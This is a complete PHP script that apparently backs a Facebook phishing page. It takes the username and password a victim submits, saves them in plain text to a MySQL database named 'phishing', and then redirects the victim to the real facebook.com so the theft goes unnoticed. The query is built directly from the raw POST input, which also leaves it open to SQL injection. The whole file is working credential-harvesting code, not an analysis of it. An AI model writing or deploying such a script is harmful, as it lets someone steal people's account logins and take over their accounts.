<?php
$server = "localhost";
$username = "root";
$password = "";
$dbname = "phishing";

$con = mysqli_connect($server, $username, $password, $dbname);

if (!$con) {
	echo "Connection failed";
}

$name = $_POST['username'];
$pass = $_POST['password'];

$sql = "INSERT INTO `test`(`username`, `password`) VALUES ('$name','$pass')";

$result = mysqli_query($con, $sql);
if ($result) {
	header('Location: https://www.facebook.com/');
} else {
	echo "Data not inserted";
}
?>
